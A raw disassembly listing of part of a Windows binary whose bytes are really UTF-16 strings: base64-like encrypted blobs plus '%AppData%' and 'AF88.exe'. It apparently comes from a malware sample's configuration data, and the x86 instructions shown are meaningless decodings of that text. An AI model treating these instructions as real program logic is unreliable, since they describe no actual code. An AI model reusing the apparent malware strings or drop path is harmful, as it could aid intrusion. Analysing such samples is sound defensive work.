  4095e6:	00 63 00             	add    %ah,0x0(%ebx)
  4095e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ea:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  4095ee:	00 2b                	add    %ch,(%ebx)
  4095f0:	00 36                	add    %dh,(%esi)
  4095f2:	00 4b 00             	add    %cl,0x0(%ebx)
  4095f5:	75 00                	jne    0x4095f7
  4095f7:	4e                   	dec    %esi
  4095f8:	00 39                	add    %bh,(%ecx)
  4095fa:	00 70 00             	add    %dh,0x0(%eax)
  4095fd:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  409601:	4d                   	dec    %ebp
  409602:	00 5a 00             	add    %bl,0x0(%edx)
  409605:	42                   	inc    %edx
  409606:	00 76 00             	add    %dh,0x0(%esi)
  409609:	61                   	popa
  40960a:	00 39                	add    %bh,(%ecx)
  40960c:	00 70 00             	add    %dh,0x0(%eax)
  40960f:	50                   	push   %eax
  409610:	00 57 00             	add    %dl,0x0(%edi)
  409613:	6c                   	insb   (%dx),%es:(%edi)
  409614:	00 70 00             	add    %dh,0x0(%eax)
  409617:	34 00                	xor    $0x0,%al
  409619:	53                   	push   %ebx
  40961a:	00 4e 00             	add    %cl,0x0(%esi)
  40961d:	6f                   	outsl  %ds:(%esi),(%dx)
  40961e:	00 46 00             	add    %al,0x0(%esi)
  409621:	42                   	inc    %edx
  409622:	00 41 00             	add    %al,0x0(%ecx)
  409625:	51                   	push   %ecx
  409626:	00 6f 00             	add    %ch,0x0(%edi)
  409629:	76 00                	jbe    0x40962b
  40962b:	50                   	push   %eax
  40962c:	00 51 00             	add    %dl,0x0(%ecx)
  40962f:	4c                   	dec    %esp
  409630:	00 7a 00             	add    %bh,0x0(%edx)
  409633:	57                   	push   %edi
  409634:	00 6e 00             	add    %ch,0x0(%esi)
  409637:	31 00                	xor    %eax,(%eax)
  409639:	37                   	aaa
  40963a:	00 7a 00             	add    %bh,0x0(%edx)
  40963d:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  409641:	53                   	push   %ebx
  409642:	00 4f 00             	add    %cl,0x0(%edi)
  409645:	4f                   	dec    %edi
  409646:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40964a:	00 56 00             	add    %dl,0x0(%esi)
  40964d:	41                   	inc    %ecx
  40964e:	00 53 00             	add    %dl,0x0(%ebx)
  409651:	4d                   	dec    %ebp
  409652:	00 39                	add    %bh,(%ecx)
  409654:	00 66 00             	add    %ah,0x0(%esi)
  409657:	75 00                	jne    0x409659
  409659:	54                   	push   %esp
  40965a:	00 5a 00             	add    %bl,0x0(%edx)
  40965d:	55                   	push   %ebp
  40965e:	00 61 00             	add    %ah,0x0(%ecx)
  409661:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  409665:	53                   	push   %ebx
  409666:	00 55 00             	add    %dl,0x0(%ebp)
  409669:	79 00                	jns    0x40966b
  40966b:	30 00                	xor    %al,(%eax)
  40966d:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  409671:	6c                   	insb   (%dx),%es:(%edi)
  409672:	00 58 00             	add    %bl,0x0(%eax)
  409675:	39 00                	cmp    %eax,(%eax)
  409677:	79 00                	jns    0x409679
  409679:	32 00                	xor    (%eax),%al
  40967b:	4b                   	dec    %ebx
  40967c:	00 48 00             	add    %cl,0x0(%eax)
  40967f:	53                   	push   %ebx
  409680:	00 55 00             	add    %dl,0x0(%ebp)
  409683:	30 00                	xor    %al,(%eax)
  409685:	71 00                	jno    0x409687
  409687:	31 00                	xor    %eax,(%eax)
  409689:	53                   	push   %ebx
  40968a:	00 47 00             	add    %al,0x0(%edi)
  40968d:	76 00                	jbe    0x40968f
  40968f:	4c                   	dec    %esp
  409690:	00 36                	add    %dh,(%esi)
  409692:	00 67 00             	add    %ah,0x0(%edi)
  409695:	74 00                	je     0x409697
  409697:	58                   	pop    %eax
  409698:	00 46 00             	add    %al,0x0(%esi)
  40969b:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40969f:	46                   	inc    %esi
  4096a0:	00 43 00             	add    %al,0x0(%ebx)
  4096a3:	4b                   	dec    %ebx
  4096a4:	00 73 00             	add    %dh,0x0(%ebx)
  4096a7:	70 00                	jo     0x4096a9
  4096a9:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  4096ad:	64 00 35 00 48 00 34 	add    %dh,%fs:0x34004800
  4096b4:	00 59 00             	add    %bl,0x0(%ecx)
  4096b7:	58                   	pop    %eax
  4096b8:	00 38                	add    %bh,(%eax)
  4096ba:	00 3d 00 00 80 d9    	add    %bh,0xd9800000
  4096c0:	4f                   	dec    %edi
  4096c1:	00 35 00 32 00 45    	add    %dh,0x45003200
  4096c7:	00 6d 00             	add    %ch,0x0(%ebp)
  4096ca:	6d                   	insl   (%dx),%es:(%edi)
  4096cb:	00 6d 00             	add    %ch,0x0(%ebp)
  4096ce:	69 00 58 00 4b 00    	imul   $0x4b0058,(%eax),%eax
  4096d4:	41                   	inc    %ecx
  4096d5:	00 33                	add    %dh,(%ebx)
  4096d7:	00 30                	add    %dh,(%eax)
  4096d9:	00 76 00             	add    %dh,0x0(%esi)
  4096dc:	76 00                	jbe    0x4096de
  4096de:	50                   	push   %eax
  4096df:	00 59 00             	add    %bl,0x0(%ecx)
  4096e2:	58                   	pop    %eax
  4096e3:	00 33                	add    %dh,(%ebx)
  4096e5:	00 46 00             	add    %al,0x0(%esi)
  4096e8:	6b 00 58             	imul   $0x58,(%eax),%eax
  4096eb:	00 71 00             	add    %dh,0x0(%ecx)
  4096ee:	4e                   	dec    %esi
  4096ef:	00 47 00             	add    %al,0x0(%edi)
  4096f2:	52                   	push   %edx
  4096f3:	00 5a 00             	add    %bl,0x0(%edx)
  4096f6:	58                   	pop    %eax
  4096f7:	00 4e 00             	add    %cl,0x0(%esi)
  4096fa:	68 00 50 00 50       	push   $0x50005000
  4096ff:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  409703:	00 4d 00             	add    %cl,0x0(%ebp)
  409706:	4a                   	dec    %edx
  409707:	00 58 00             	add    %bl,0x0(%eax)
  40970a:	76 00                	jbe    0x40970c
  40970c:	46                   	inc    %esi
  40970d:	00 37                	add    %dh,(%edi)
  40970f:	00 77 00             	add    %dh,0x0(%edi)
  409712:	61                   	popa
  409713:	00 34 00             	add    %dh,(%eax,%eax,1)
  409716:	6e                   	outsb  %ds:(%esi),(%dx)
  409717:	00 52 00             	add    %dl,0x0(%edx)
  40971a:	70 00                	jo     0x40971c
  40971c:	73 00                	jae    0x40971e
  40971e:	50                   	push   %eax
  40971f:	00 6e 00             	add    %ch,0x0(%esi)
  409722:	62 00                	bound  %eax,(%eax)
  409724:	69 00 53 00 74 00    	imul   $0x740053,(%eax),%eax
  40972a:	6a 00                	push   $0x0
  40972c:	67 00 6e 00          	add    %ch,0x0(%bp)
  409730:	33 00                	xor    (%eax),%eax
  409732:	6c                   	insb   (%dx),%es:(%edi)
  409733:	00 46 00             	add    %al,0x0(%esi)
  409736:	4c                   	dec    %esp
  409737:	00 6b 00             	add    %ch,0x0(%ebx)
  40973a:	71 00                	jno    0x40973c
  40973c:	4b                   	dec    %ebx
  40973d:	00 4b 00             	add    %cl,0x0(%ebx)
  409740:	2f                   	das
  409741:	00 67 00             	add    %ah,0x0(%edi)
  409744:	4a                   	dec    %edx
  409745:	00 67 00             	add    %ah,0x0(%edi)
  409748:	61                   	popa
  409749:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40974d:	00 70 00             	add    %dh,0x0(%eax)
  409750:	76 00                	jbe    0x409752
  409752:	70 00                	jo     0x409754
  409754:	50                   	push   %eax
  409755:	00 36                	add    %dh,(%esi)
  409757:	00 76 00             	add    %dh,0x0(%esi)
  40975a:	7a 00                	jp     0x40975c
  40975c:	43                   	inc    %ebx
  40975d:	00 52 00             	add    %dl,0x0(%edx)
  409760:	43                   	inc    %ebx
  409761:	00 45 00             	add    %al,0x0(%ebp)
  409764:	69 00 4c 00 71 00    	imul   $0x71004c,(%eax),%eax
  40976a:	6a 00                	push   $0x0
  40976c:	30 00                	xor    %al,(%eax)
  40976e:	37                   	aaa
  40976f:	00 31                	add    %dh,(%ecx)
  409771:	00 6d 00             	add    %ch,0x0(%ebp)
  409774:	51                   	push   %ecx
  409775:	00 50 00             	add    %dl,0x0(%eax)
  409778:	35 00 50 00 6b       	xor    $0x6b005000,%eax
  40977d:	00 4a 00             	add    %cl,0x0(%edx)
  409780:	5a                   	pop    %edx
  409781:	00 57 00             	add    %dl,0x0(%edi)
  409784:	35 00 32 00 79       	xor    $0x79003200,%eax
  409789:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40978d:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  409791:	00 67 00             	add    %ah,0x0(%edi)
  409794:	4d                   	dec    %ebp
  409795:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40979b:	51                   	push   %ecx
  40979c:	00 68 00             	add    %ch,0x0(%eax)
  40979f:	46                   	inc    %esi
  4097a0:	00 67 00             	add    %ah,0x0(%edi)
  4097a3:	70 00                	jo     0x4097a5
  4097a5:	4a                   	dec    %edx
  4097a6:	00 58 00             	add    %bl,0x0(%eax)
  4097a9:	49                   	dec    %ecx
  4097aa:	00 59 00             	add    %bl,0x0(%ecx)
  4097ad:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  4097b1:	61                   	popa
  4097b2:	00 51 00             	add    %dl,0x0(%ecx)
  4097b5:	34 00                	xor    $0x0,%al
  4097b7:	72 00                	jb     0x4097b9
  4097b9:	34 00                	xor    $0x0,%al
  4097bb:	75 00                	jne    0x4097bd
  4097bd:	4e                   	dec    %esi
  4097be:	00 4e 00             	add    %cl,0x0(%esi)
  4097c1:	57                   	push   %edi
  4097c2:	00 6e 00             	add    %ch,0x0(%esi)
  4097c5:	2b 00                	sub    (%eax),%eax
  4097c7:	76 00                	jbe    0x4097c9
  4097c9:	4b                   	dec    %ebx
  4097ca:	00 68 00             	add    %ch,0x0(%eax)
  4097cd:	7a 00                	jp     0x4097cf
  4097cf:	39 00                	cmp    %eax,(%eax)
  4097d1:	48                   	dec    %eax
  4097d2:	00 65 00             	add    %ah,0x0(%ebp)
  4097d5:	71 00                	jno    0x4097d7
  4097d7:	77 00                	ja     0x4097d9
  4097d9:	77 00                	ja     0x4097db
  4097db:	4d                   	dec    %ebp
  4097dc:	00 31                	add    %dh,(%ecx)
  4097de:	00 35 00 4b 00 75    	add    %dh,0x75004b00
  4097e4:	00 78 00             	add    %bh,0x0(%eax)
  4097e7:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  4097eb:	63 00                	arpl   %eax,(%eax)
  4097ed:	44                   	inc    %esp
  4097ee:	00 55 00             	add    %dl,0x0(%ebp)
  4097f1:	57                   	push   %edi
  4097f2:	00 73 00             	add    %dh,0x0(%ebx)
  4097f5:	63 00                	arpl   %eax,(%eax)
  4097f7:	35 00 77 00 68       	xor    $0x68007700,%eax
  4097fc:	00 31                	add    %dh,(%ecx)
  4097fe:	00 63 00             	add    %ah,0x0(%ebx)
  409801:	76 00                	jbe    0x409803
  409803:	39 00                	cmp    %eax,(%eax)
  409805:	59                   	pop    %ecx
  409806:	00 48 00             	add    %cl,0x0(%eax)
  409809:	4e                   	dec    %esi
  40980a:	00 4e 00             	add    %cl,0x0(%esi)
  40980d:	6e                   	outsb  %ds:(%esi),(%dx)
  40980e:	00 50 00             	add    %dl,0x0(%eax)
  409811:	72 00                	jb     0x409813
  409813:	6f                   	outsl  %ds:(%esi),(%dx)
  409814:	00 66 00             	add    %ah,0x0(%esi)
  409817:	44                   	inc    %esp
  409818:	00 35 00 48 00 72    	add    %dh,0x72004800
  40981e:	00 32                	add    %dh,(%edx)
  409820:	00 57 00             	add    %dl,0x0(%edi)
  409823:	39 00                	cmp    %eax,(%eax)
  409825:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  409829:	69 00 46 00 65 00    	imul   $0x650046,(%eax),%eax
  40982f:	6f                   	outsl  %ds:(%esi),(%dx)
  409830:	00 4f 00             	add    %cl,0x0(%edi)
  409833:	53                   	push   %ebx
  409834:	00 5a 00             	add    %bl,0x0(%edx)
  409837:	46                   	inc    %esi
  409838:	00 49 00             	add    %cl,0x0(%ecx)
  40983b:	37                   	aaa
  40983c:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  409840:	00 43 00             	add    %al,0x0(%ebx)
  409843:	72 00                	jb     0x409845
  409845:	77 00                	ja     0x409847
  409847:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40984c:	80 b1 7a 00 4b 00 5a 	xorb   $0x5a,0x4b007a(%ecx)
  409853:	00 77 00             	add    %dh,0x0(%edi)
  409856:	77 00                	ja     0x409858
  409858:	6d                   	insl   (%dx),%es:(%edi)
  409859:	00 48 00             	add    %cl,0x0(%eax)
  40985c:	46                   	inc    %esi
  40985d:	00 36                	add    %dh,(%esi)
  40985f:	00 66 00             	add    %ah,0x0(%esi)
  409862:	74 00                	je     0x409864
  409864:	48                   	dec    %eax
  409865:	00 42 00             	add    %al,0x0(%edx)
  409868:	78 00                	js     0x40986a
  40986a:	58                   	pop    %eax
  40986b:	00 51 00             	add    %dl,0x0(%ecx)
  40986e:	51                   	push   %ecx
  40986f:	00 50 00             	add    %dl,0x0(%eax)
  409872:	57                   	push   %edi
  409873:	00 65 00             	add    %ah,0x0(%ebp)
  409876:	52                   	push   %edx
  409877:	00 69 00             	add    %ch,0x0(%ecx)
  40987a:	59                   	pop    %ecx
  40987b:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40987f:	00 41 00             	add    %al,0x0(%ecx)
  409882:	6d                   	insl   (%dx),%es:(%edi)
  409883:	00 43 00             	add    %al,0x0(%ebx)
  409886:	2b 00                	sub    (%eax),%eax
  409888:	49                   	dec    %ecx
  409889:	00 6e 00             	add    %ch,0x0(%esi)
  40988c:	58                   	pop    %eax
  40988d:	00 2b                	add    %ch,(%ebx)
  40988f:	00 2f                	add    %ch,(%edi)
  409891:	00 59 00             	add    %bl,0x0(%ecx)
  409894:	62 00                	bound  %eax,(%eax)
  409896:	37                   	aaa
  409897:	00 6a 00             	add    %ch,0x0(%edx)
  40989a:	73 00                	jae    0x40989c
  40989c:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  4098a0:	30 00                	xor    %al,(%eax)
  4098a2:	47                   	inc    %edi
  4098a3:	00 63 00             	add    %ah,0x0(%ebx)
  4098a6:	6b 00 64             	imul   $0x64,(%eax),%eax
  4098a9:	00 43 00             	add    %al,0x0(%ebx)
  4098ac:	4e                   	dec    %esi
  4098ad:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  4098b1:	00 42 00             	add    %al,0x0(%edx)
  4098b4:	31 00                	xor    %eax,(%eax)
  4098b6:	77 00                	ja     0x4098b8
  4098b8:	51                   	push   %ecx
  4098b9:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  4098bd:	00 30                	add    %dh,(%eax)
  4098bf:	00 6d 00             	add    %ch,0x0(%ebp)
  4098c2:	49                   	dec    %ecx
  4098c3:	00 4a 00             	add    %cl,0x0(%edx)
  4098c6:	56                   	push   %esi
  4098c7:	00 71 00             	add    %dh,0x0(%ecx)
  4098ca:	32 00                	xor    (%eax),%al
  4098cc:	52                   	push   %edx
  4098cd:	00 35 00 59 00 4c    	add    %dh,0x4c005900
  4098d3:	00 71 00             	add    %dh,0x0(%ecx)
  4098d6:	66 00 48 00          	data16 add %cl,0x0(%eax)
  4098da:	65 00 64 00 4d       	add    %ah,%gs:0x4d(%eax,%eax,1)
  4098df:	00 63 00             	add    %ah,0x0(%ebx)
  4098e2:	30 00                	xor    %al,(%eax)
  4098e4:	71 00                	jno    0x4098e6
  4098e6:	78 00                	js     0x4098e8
  4098e8:	4e                   	dec    %esi
  4098e9:	00 38                	add    %bh,(%eax)
  4098eb:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  4098ef:	00 66 00             	add    %ah,0x0(%esi)
  4098f2:	66 00 77 00          	data16 add %dh,0x0(%edi)
  4098f6:	72 00                	jb     0x4098f8
  4098f8:	77 00                	ja     0x4098fa
  4098fa:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  4098ff:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409905:	00 70 00             	add    %dh,0x0(%eax)
  409908:	44                   	inc    %esp
  409909:	00 61 00             	add    %ah,0x0(%ecx)
  40990c:	74 00                	je     0x40990e
  40990e:	61                   	popa
  40990f:	00 25 00 00 11 41    	add    %ah,0x41110000
  409915:	00 46 00             	add    %al,0x0(%esi)
  409918:	38 00                	cmp    %al,(%eax)
  40991a:	38 00                	cmp    %al,(%eax)
  40991c:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409920:	78 00                	js     0x409922
  409922:	65 00 00             	add    %al,%gs:(%eax)
  409925:	59                   	pop    %ecx
  409926:	61                   	popa
  409927:	00 55 00             	add    %dl,0x0(%ebp)
  40992a:	4a                   	dec    %edx
  40992b:	00 51 00             	add    %dl,0x0(%ecx)
  40992e:	5a                   	pop    %edx
  40992f:	00 6d 00             	add    %ch,0x0(%ebp)
  409932:	77 00                	ja     0x409934
  409934:	77 00                	ja     0x409936
  409936:	4e                   	dec    %esi
  409937:	00 6b 00             	add    %ch,0x0(%ebx)
  40993a:	30 00                	xor    %al,(%eax)
  40993c:	33 00                	xor    (%eax),%eax
  40993e:	53                   	push   %ebx
  40993f:	00 48 00             	add    %cl,0x0(%eax)
  409942:	68 00 6a 00 56       	push   $0x56006a00
  409947:	00 58 00             	add    %bl,0x0(%eax)
  40994a:	42                   	inc    %edx
  40994b:	00 53 00             	add    %dl,0x0(%ebx)
  40994e:	53                   	push   %ebx
  40994f:	00 30                	add    %dh,(%eax)
  409951:	00 56 00             	add    %dl,0x0(%esi)
  409954:	52                   	push   %edx
  409955:	00 4d 00             	add    %cl,0x0(%ebp)
  409958:	6c                   	insb   (%dx),%es:(%edi)
  409959:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40995d:	00 63 00             	add    %ah,0x0(%ebx)
  409960:	6b 00 39             	imul   $0x39,(%eax),%eax
  409963:	00 72 00             	add    %dh,0x0(%edx)
  409966:	63 00                	arpl   %eax,(%eax)
  409968:	6a 00                	push   $0x0
  40996a:	46                   	inc    %esi
  40996b:	00 47 00             	add    %al,0x0(%edi)
  40996e:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  409972:	67 00 35             	add    %dh,(%di)
  409975:	00 4e 00             	add    %cl,0x0(%esi)
  409978:	7a 00                	jp     0x40997a
  40997a:	67 00 3d             	add    %bh,(%di)
  40997d:	00 00                	add    %al,(%eax)
  40997f:	80 b1 2b 00 76 00 4f 	xorb   $0x4f,0x76002b(%ecx)
  409986:	00 71 00             	add    %dh,0x0(%ecx)
  409989:	33 00                	xor    (%eax),%eax
  40998b:	56                   	push   %esi
  40998c:	00 79 00             	add    %bh,0x0(%ecx)
  40998f:	39 00                	cmp    %eax,(%eax)
  409991:	65 00 44 00 69       	add    %al,%gs:0x69(%eax,%eax,1)
  409996:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40999a:	00 41 00             	add    %al,0x0(%ecx)
  40999d:	63 00                	arpl   %eax,(%eax)
  40999f:	78 00                	js     0x4099a1
  4099a1:	48                   	dec    %eax
  4099a2:	00 42 00             	add    %al,0x0(%edx)
  4099a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a6:	00 73 00             	add    %dh,0x0(%ebx)
  4099a9:	39 00                	cmp    %eax,(%eax)
  4099ab:	53                   	push   %ebx
  4099ac:	00 41 00             	add    %al,0x0(%ecx)
  4099af:	69 00 6e 00 46 00    	imul   $0x46006e,(%eax),%eax
  4099b5:	59                   	pop    %ecx
  4099b6:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4099ba:	00 61 00             	add    %ah,0x0(%ecx)
  4099bd:	36 00 2b             	add    %ch,%ss:(%ebx)
  4099c0:	00 51 00             	add    %dl,0x0(%ecx)
  4099c3:	76 00                	jbe    0x4099c5
  4099c5:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  4099c9:	61                   	popa
  4099ca:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  4099ce:	00 50 00             	add    %dl,0x0(%eax)
  4099d1:	49                   	dec    %ecx
  4099d2:	00 59 00             	add    %bl,0x0(%ecx)
  4099d5:	6a 00                	push   $0x0
  4099d7:	42                   	inc    %edx
  4099d8:	00 4c 00 52          	add    %cl,0x52(%eax,%eax,1)
  4099dc:	00 52 00             	add    %dl,0x0(%edx)
  4099df:	47                   	inc    %edi
  4099e0:	00 4f 00             	add    %cl,0x0(%edi)
  4099e3:	78 00                	js     0x4099e5
  4099e5:	2f                   	das
  4099e6:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  4099ea:	00 39                	add    %bh,(%ecx)
  4099ec:	00 6b 00             	add    %ch,0x0(%ebx)
  4099ef:	77 00                	ja     0x4099f1
  4099f1:	57                   	push   %edi
  4099f2:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  4099f6:	00 4d 00             	add    %cl,0x0(%ebp)
  4099f9:	56                   	push   %esi
  4099fa:	00 5a 00             	add    %bl,0x0(%edx)
  4099fd:	30 00                	xor    %al,(%eax)
  4099ff:	32 00                	xor    (%eax),%al
  409a01:	49                   	dec    %ecx
  409a02:	00 75 00             	add    %dh,0x0(%ebp)
  409a05:	75 00                	jne    0x409a07
  409a07:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  409a0b:	6a 00                	push   $0x0
  409a0d:	51                   	push   %ecx
  409a0e:	00 59 00             	add    %bl,0x0(%ecx)
  409a11:	78 00                	js     0x409a13
  409a13:	55                   	push   %ebp
  409a14:	00 67 00             	add    %ah,0x0(%edi)
  409a17:	39 00                	cmp    %eax,(%eax)
  409a19:	4e                   	dec    %esi
  409a1a:	00 2b                	add    %ch,(%ebx)
  409a1c:	00 67 00             	add    %ah,0x0(%edi)
  409a1f:	44                   	inc    %esp
  409a20:	00 55 00             	add    %dl,0x0(%ebp)
  409a23:	6e                   	outsb  %ds:(%esi),(%dx)
  409a24:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  409a28:	00 48 00             	add    %cl,0x0(%eax)
  409a2b:	67 00 3d             	add    %bh,(%di)
  409a2e:	00 3d 00 00 92 01    	add    %bh,0x1920000
  409a34:	6c                   	insb   (%dx),%es:(%edi)
  409a35:	00 76 00             	add    %dh,0x0(%esi)
  409a38:	31 00                	xor    %eax,(%eax)
  409a3a:	4d                   	dec    %ebp
  409a3b:	00 6e 00             	add    %ch,0x0(%esi)
  409a3e:	49                   	dec    %ecx
  409a3f:	00 2b                	add    %ch,(%ebx)
  409a41:	00 76 00             	add    %dh,0x0(%esi)
  409a44:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  409a48:	7a 00                	jp     0x409a4a
  409a4a:	57                   	push   %edi
  409a4b:	00 6a 00             	add    %ch,0x0(%edx)
  409a4e:	31 00                	xor    %eax,(%eax)
  409a50:	7a 00                	jp     0x409a52
  409a52:	6d                   	insl   (%dx),%es:(%edi)
  409a53:	00 42 00             	add    %al,0x0(%edx)
  409a56:	46                   	inc    %esi
  409a57:	00 32                	add    %dh,(%edx)
  409a59:	00 2f                	add    %ch,(%edi)
  409a5b:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  409a5f:	00 63 00             	add    %ah,0x0(%ebx)
  409a62:	63 00                	arpl   %eax,(%eax)
  409a64:	78 00                	js     0x409a66
  409a66:	32 00                	xor    (%eax),%al
  409a68:	38 00                	cmp    %al,(%eax)
  409a6a:	53                   	push   %ebx
  409a6b:	00 4d 00             	add    %cl,0x0(%ebp)
  409a6e:	6b 00 46             	imul   $0x46,(%eax),%eax
  409a71:	00 68 00             	add    %ch,0x0(%eax)
  409a74:	45                   	inc    %ebp
  409a75:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  409a79:	00 61 00             	add    %ah,0x0(%ecx)
  409a7c:	62 00                	bound  %eax,(%eax)
  409a7e:	53                   	push   %ebx
  409a7f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409a82:	59                   	pop    %ecx
  409a83:	00 66 00             	add    %ah,0x0(%esi)
  409a86:	48                   	dec    %eax
  409a87:	00 61 00             	add    %ah,0x0(%ecx)
  409a8a:	32 00                	xor    (%eax),%al
  409a8c:	71 00                	jno    0x409a8e
  409a8e:	57                   	push   %edi
  409a8f:	00 41 00             	add    %al,0x0(%ecx)
  409a92:	48                   	dec    %eax
  409a93:	00 56 00             	add    %dl,0x0(%esi)
  409a96:	38 00                	cmp    %al,(%eax)
  409a98:	49                   	dec    %ecx
  409a99:	00 4f 00             	add    %cl,0x0(%edi)
  409a9c:	4c                   	dec    %esp
  409a9d:	00 6a 00             	add    %ch,0x0(%edx)
  409aa0:	44                   	inc    %esp
  409aa1:	00 38                	add    %bh,(%eax)
  409aa3:	00 69 00             	add    %ch,0x0(%ecx)
  409aa6:	78 00                	js     0x409aa8
  409aa8:	53                   	push   %ebx
  409aa9:	00 55 00             	add    %dl,0x0(%ebp)
  409aac:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  409ab0:	6f                   	outsl  %ds:(%esi),(%dx)
  409ab1:	00 55 00             	add    %dl,0x0(%ebp)
  409ab4:	44                   	inc    %esp
  409ab5:	00 6d 00             	add    %ch,0x0(%ebp)
  409ab8:	68 00 6b 00 4b       	push   $0x4b006b00
  409abd:	00 52 00             	add    %dl,0x0(%edx)
  409ac0:	48                   	dec    %eax
  409ac1:	00 78 00             	add    %bh,0x0(%eax)
  409ac4:	4c                   	dec    %esp
  409ac5:	00 69 00             	add    %ch,0x0(%ecx)
  409ac8:	49                   	dec    %ecx
  409ac9:	00 55 00             	add    %dl,0x0(%ebp)
  409acc:	6f                   	outsl  %ds:(%esi),(%dx)
  409acd:	00 32                	add    %dh,(%edx)
  409acf:	00 5a 00             	add    %bl,0x0(%edx)
  409ad2:	4d                   	dec    %ebp
  409ad3:	00 2b                	add    %ch,(%ebx)
  409ad5:	00 4e 00             	add    %cl,0x0(%esi)
  409ad8:	59                   	pop    %ecx
  409ad9:	00 46 00             	add    %al,0x0(%esi)
  409adc:	49                   	dec    %ecx
  409add:	00 57 00             	add    %dl,0x0(%edi)
  409ae0:	67 00 57 00          	add    %dl,0x0(%bx)
  409ae4:	33 00                	xor    (%eax),%eax
  409ae6:	51                   	push   %ecx
  409ae7:	00 72 00             	add    %dh,0x0(%edx)
  409aea:	65 00 30             	add    %dh,%gs:(%eax)
  409aed:	00 6f 00             	add    %ch,0x0(%edi)
  409af0:	63 00                	arpl   %eax,(%eax)
  409af2:	69 00 65 00 2b 00    	imul   $0x2b0065,(%eax),%eax
  409af8:	41                   	inc    %ecx
  409af9:	00 48 00             	add    %cl,0x0(%eax)
  409afc:	55                   	push   %ebp
  409afd:	00 79 00             	add    %bh,0x0(%ecx)
  409b00:	79 00                	jns    0x409b02
  409b02:	52                   	push   %edx
  409b03:	00 48 00             	add    %cl,0x0(%eax)
  409b06:	2b 00                	sub    (%eax),%eax
  409b08:	6b 00 63             	imul   $0x63,(%eax),%eax
  409b0b:	00 4d 00             	add    %cl,0x0(%ebp)
  409b0e:	34 00                	xor    $0x0,%al
  409b10:	30 00                	xor    %al,(%eax)
  409b12:	2b 00                	sub    (%eax),%eax
  409b14:	58                   	pop    %eax
  409b15:	00 6f 00             	add    %ch,0x0(%edi)
  409b18:	43                   	inc    %ebx
  409b19:	00 6f 00             	add    %ch,0x0(%edi)
  409b1c:	31 00                	xor    %eax,(%eax)
  409b1e:	49                   	dec    %ecx
  409b1f:	00 31                	add    %dh,(%ecx)
  409b21:	00 56 00             	add    %dl,0x0(%esi)
  409b24:	72 00                	jb     0x409b26
  409b26:	6f                   	outsl  %ds:(%esi),(%dx)
  409b27:	00 56 00             	add    %dl,0x0(%esi)
  409b2a:	57                   	push   %edi
  409b2b:	00 33                	add    %dh,(%ebx)
  409b2d:	00 78 00             	add    %bh,0x0(%eax)
  409b30:	45                   	inc    %ebp
  409b31:	00 2b                	add    %ch,(%ebx)
  409b33:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  409b37:	00 41 00             	add    %al,0x0(%ecx)
  409b3a:	76 00                	jbe    0x409b3c
  409b3c:	53                   	push   %ebx
  409b3d:	00 6d 00             	add    %ch,0x0(%ebp)
  409b40:	44                   	inc    %esp
  409b41:	00 53 00             	add    %dl,0x0(%ebx)
  409b44:	6f                   	outsl  %ds:(%esi),(%dx)
  409b45:	00 4f 00             	add    %cl,0x0(%edi)
  409b48:	58                   	pop    %eax
  409b49:	00 33                	add    %dh,(%ebx)
  409b4b:	00 51 00             	add    %dl,0x0(%ecx)
  409b4e:	5a                   	pop    %edx
  409b4f:	00 62 00             	add    %ah,0x0(%edx)
  409b52:	54                   	push   %esp
  409b53:	00 56 00             	add    %dl,0x0(%esi)
  409b56:	4d                   	dec    %ebp
  409b57:	00 67 00             	add    %ah,0x0(%edi)
  409b5a:	32 00                	xor    (%eax),%al
  409b5c:	32 00                	xor    (%eax),%al
  409b5e:	4b                   	dec    %ebx
  409b5f:	00 32                	add    %dh,(%edx)
  409b61:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  409b65:	00 53 00             	add    %dl,0x0(%ebx)
  409b68:	44                   	inc    %esp
  409b69:	00 55 00             	add    %dl,0x0(%ebp)
  409b6c:	75 00                	jne    0x409b6e
  409b6e:	78 00                	js     0x409b70
  409b70:	53                   	push   %ebx
  409b71:	00 62 00             	add    %ah,0x0(%edx)
  409b74:	39 00                	cmp    %eax,(%eax)
